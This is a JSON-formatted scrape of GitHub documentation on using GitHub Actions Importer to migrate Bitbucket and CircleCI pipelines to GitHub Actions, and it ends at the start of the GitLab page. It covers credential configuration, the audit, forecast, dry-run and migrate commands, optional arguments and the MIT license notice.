        "type": "heading",
        "level": 2,
        "text": "Performing a production migration"
      },
      {
        "type": "paragraph",
        "text": "You can use the migrate command to convert a Bitbucket pipeline and open a pull request with the equivalent GitHub Actions workflow(s)."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command"
      },
      {
        "type": "paragraph",
        "text": "To migrate a Bitbucket pipeline to GitHub Actions, run the following command in your terminal, replacing the following values."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Replacetarget-urlvalue with the URL for your GitHub repository.",
          "Replace:repowith the name of the repository in Bitbucket.",
          "Replace:workspacewith the name of the workspace."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate bitbucket --workspace :workspace --repository :repo --target-url https://github.com/:owner/:repo --output-dir tmp/dry-run"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate bitbucket --workspace actions-importer --repository custom-trigger --target-url https://github.com/valet-dev-testing/demo-private --output-dir tmp/bitbucket\n[2023-07-18 09:56:06] Logs: 'tmp/bitbucket/log/valet-20230718-165606.log'\n[2023-07-18 09:56:24] Pull request: 'https://github.com/valet-dev-testing/demo-private/pull/55'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Bitbucket Pipelines."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your Bitbucket instance."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a transformed workflow (requiresrepoandworkflowscopes).",
          "GITHUB_INSTANCE_URL: The url to the target GitHub instance. (e.g.https://github.com)",
          "BITBUCKET_ACCESS_TOKEN: The workspace access token with read scopes for pipeline, project, and repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that will be loaded by GitHub Actions Importer at run time. The distribution archive contains a.env.local.templatefile that can be used to create these files."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with thedry-runormigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from the Bitbucket instance. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run --source-file-path path/to/my/pipeline/file.yml"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from the Bitbucket instance. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit --config-file-path \"path/to/my/bitbucket/config.yml\""
      },
      {
        "type": "paragraph",
        "text": "To audit a Bitbucket instance using a config file, the config file must be in the following format, and eachrepository_slugmust be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: repo_name\n    path: path/to/one/source/file.yml\n  - repository_slug: another_repo_name\n    path: path/to/another/source/file.yml"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Supported syntax for Bitbucket Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the type of properties that GitHub Actions Importer is currently able to convert."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variable mapping"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default Bitbucket environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "System Variables"
      },
      {
        "type": "paragraph",
        "text": "System variables used in tasks are transformed to the equivalent bash shell variable and are assumed to be available. For example,${system.<variable.name>}will be transformed to$variable_name. We recommend you verify this to ensure proper operation of the workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from CircleCI with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate CircleCI pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A CircleCI account or organization with projects and pipelines that you want to convert to GitHub Actions workflows.",
          "Access to create a CircleCI personal API token for your account or organization.",
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations when migrating from CircleCI to GitHub Actions with GitHub Actions Importer:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Automatic caching in between jobs of different workflows is not supported.",
          "Theauditcommand is only supported when you use a CircleCI organization account. Thedry-runandmigratecommands can be used with a CircleCI organization or user account."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "Certain CircleCI constructs must be migrated manually. These include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Contexts",
          "Project-level environment variables",
          "Unknown job properties",
          "Unknown orbs"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with CircleCI and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create a CircleCI personal API token. For more information, seeManaging API Tokensin the CircleCI documentation.After creating the token, copy it and save it in a safe location for later use.",
          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectCircleCI, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Personal access token for CircleCI\", enter the value for the CircleCI personal API token that you created earlier, and pressEnter.For \"Base url of the CircleCI instance\", pressEnterto accept the default value (https://circleci.com).For \"CircleCI organization name\", enter the name for your CircleCI organization, and pressEnter.An example of theconfigurecommand is shown below:$gh actions-importer configure✔ Which CI providers are you configuring?: CircleCI\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Personal access token for CircleCI: ********************\n✔ Base url of the CircleCI instance: https://circleci.com\n✔ CircleCI organization name: mycircleciorganization\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectCircleCI, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Personal access token for CircleCI\", enter the value for the CircleCI personal API token that you created earlier, and pressEnter.",
          "For \"Base url of the CircleCI instance\", pressEnterto accept the default value (https://circleci.com).",
          "For \"CircleCI organization name\", enter the name for your CircleCI organization, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of CircleCI"
      },
      {
        "type": "paragraph",
        "text": "You can use theauditcommand to get a high-level view of all projects in a CircleCI organization."
      },
      {
        "type": "paragraph",
        "text": "Theauditcommand performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the projects defined in a CircleCI organization.",
          "Converts each pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit of a CircleCI organization, run the following command in your terminal:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit circle-ci --output-dir tmp/audit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecast potential GitHub Actions usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in CircleCI."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions usage, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast circle-ci --output-dir tmp/forecast_reports"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Queue timemetrics describe the amount of time a job spent waiting for a runner to be available to execute it.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, these metrics are defined for each queue of runners in CircleCI. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a dry-run migration of a CircleCI pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a CircleCI pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your CircleCI project to GitHub Actions, run the following command in your terminal, replacingmy-circle-ci-projectwith the name of your CircleCI project."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run circle-ci --output-dir tmp/dry-run --circle-ci-project my-circle-ci-project"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a production migration of a CircleCI pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use themigratecommand to convert a CircleCI pipeline and open a pull request with the equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command"
      },
      {
        "type": "paragraph",
        "text": "To migrate a CircleCI pipeline to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, andmy-circle-ci-projectwith the name of your CircleCI project."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate circle-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --circle-ci-project my-circle-ci-project"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate circle-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --circle-ci-project my-circle-ci-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from CircleCI."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your CircleCI instance:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requiresrepoandworkflowscopes).",
          "GITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example,https://github.com).",
          "CIRCLE_CI_ACCESS_TOKEN: The CircleCI personal API token used to authenticate with your CircleCI instance.",
          "CIRCLE_CI_INSTANCE_URL: The URL to the CircleCI instance (for example,https://circleci.com). If the variable is left unset,https://circleci.comis used as the default value.",
          "CIRCLE_CI_ORGANIZATION: The organization name of your CircleCI instance.",
          "CIRCLE_CI_PROVIDER: The location where your pipeline's source file is stored (such asgithub). Currently, only GitHub is supported.",
          "CIRCLE_CI_SOURCE_GITHUB_ACCESS_TOKEN(Optional): The personal access token (classic) used to authenticate with your source GitHub instance (requiresreposcope). If not provided, the value ofGITHUB_ACCESS_TOKENis used instead.",
          "CIRCLE_CI_SOURCE_GITHUB_INSTANCE_URL(Optional): The URL to the source GitHub instance. If not provided, the value ofGITHUB_INSTANCE_URLis used instead."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that is loaded by GitHub Actions Importer when it is run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with theforecast,dry-run, ormigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run circle-ci --output-dir ./output/ --source-file-path ./path/to/.circleci/config.yml"
      },
      {
        "type": "paragraph",
        "text": "If you would like to supply multiple source files when running theforecastsubcommand, you can use pattern matching in the file path value. For example,gh forecast --source-file-path ./tmp/previous_forecast/jobs/*.jsonsupplies GitHub Actions Importer with any source files that match the./tmp/previous_forecast/jobs/*.jsonfile path."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "paragraph",
        "text": "The--config-file-pathargument can also be used to specify which repository a converted composite action should be migrated to."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit circle-ci --output-dir ./output/ --config-file-path ./path/to/circle-ci/config.yml"
      },
      {
        "type": "paragraph",
        "text": "To audit a CircleCI instance using a config file, the config file must be in the following format, and eachrepository_slugmust be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: circle-org-name/circle-project-name\n    path: path/to/.circleci/config.yml\n  - repository_slug: circle-org-name/some-other-circle-project-name\n    path: path/to/.circleci/config.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Dry run example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run."
      },
      {
        "type": "paragraph",
        "text": "The pipeline is selected by matching therepository_slugin the config file to the value of the--circle-ci-organizationand--circle-ci-projectoptions. Thepathis then used to pull the specified source file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run circle-ci --circle-ci-project circle-org-name/circle-project-name --output-dir ./output/ --config-file-path ./path/to/circle-ci/config.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Specify the repository of converted composite actions"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the YAML file provided to the--config-file-pathargument to determine the repository that converted composite actions are migrated to."
      },
      {
        "type": "paragraph",
        "text": "To begin, you should run an audit without the--config-file-pathargument:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit circle-ci --output-dir ./output/"
      },
      {
        "type": "paragraph",
        "text": "The output of this command will contain a file namedconfig.ymlthat contains a list of all the composite actions that were converted by GitHub Actions Importer. For example, theconfig.ymlfile may have the following contents:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "composite_actions:\n  - name: my-composite-action.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main"
      },
      {
        "type": "paragraph",
        "text": "You can use this file to specify which repository and ref a reusable workflow or composite action should be added to. You can then use the--config-file-pathargument to provide theconfig.ymlfile to GitHub Actions Importer. For example, you can use this file when running amigratecommand to open a pull request for each unique repository defined in the config file:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate circle-ci --circle-ci-project my-project-name --output-dir output/ --config-file-path config.yml --target-url https://github.com/my-org/my-repo"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--include-from"
      },
      {
        "type": "paragraph",
        "text": "You can use the--include-fromargument with theauditsubcommand."
      },
      {
        "type": "paragraph",
        "text": "The--include-fromargument specifies a file that contains a line-delimited list of repositories to include in the audit of a CircleCI organization. Any repositories that are not included in the file are excluded from the audit."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit circle-ci --output-dir ./output/ --include-from repositories.txt"
      },
      {
        "type": "paragraph",
        "text": "The file supplied for this parameter must be a line-delimited list of repositories, for example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "repository_one\nrepository_two\nrepository_three"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported syntax for CircleCI pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the type of properties that GitHub Actions Importer is currently able to convert."
      },
      {
        "type": "paragraph",
        "text": "For more information about supported CircleCI concept and orb mappings, see thegithub/gh-actions-importerrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variable mapping"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default CircleCI environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from GitLab with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate GitLab pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
